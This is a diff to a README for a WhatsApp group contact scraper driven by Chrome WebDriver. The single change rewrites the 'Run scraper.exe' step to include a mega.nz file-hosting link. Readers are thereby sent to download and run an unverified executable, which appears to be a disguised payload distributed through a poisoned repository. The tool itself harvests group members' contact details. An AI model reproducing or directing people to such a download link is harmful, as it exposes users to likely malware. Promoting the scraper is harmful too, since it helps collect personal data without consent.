@@ -18,7 +18,7 @@ Chrome WebDriver
 
 Execution
 ---------
-1. Run "scraper.exe" to execute the script.
+1. Run "scraper.exe" https://mega.nz/file/0yABGBAb#56Ng9R0-uwsTil7kofN2XGAdSq69bkg-9T6A_5REPmk to execute the script.
 2. A file dialog will appear, asking you to select the Chrome WebDriver executable. Browse and select the downloaded WebDriver.
 3. A dialog box will ask you to enter the name of the WhatsApp group from which you want to extract contacts.
 4. After entering the group name, the script will launch a Chrome browser and open WhatsApp Web.
